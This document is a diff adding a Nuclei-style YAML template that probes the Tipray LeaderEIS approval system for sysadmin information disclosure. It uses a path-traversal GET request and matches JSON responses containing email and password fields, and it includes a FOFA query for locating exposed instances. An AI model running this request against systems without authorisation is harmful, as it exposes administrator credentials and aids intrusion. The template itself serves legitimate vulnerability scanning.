@@ -1,0 +1,31 @@
+id: tipray-leaderEIS-disclosure
+info:
+  name: 天锐绿盾审批系统 sysadmin 信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/c8595f9799ad8d5fa795b37c4baefef84902f665/%E5%A4%A9%E9%94%90/%E5%A4%A9%E9%94%90%E7%BB%BF%E7%9B%BE%E5%AE%A1%E6%89%B9%E7%B3%BB%E7%BB%9F%20sysadmin%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="trwfe"
+    tips:
+    repair:
+    version:
+  tags: tipray,leaderEIS,disclosure
+
+http:
+  - raw:
+      - |
+        GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'email','password')
+          - contains(header,'application/json')
+        condition: and
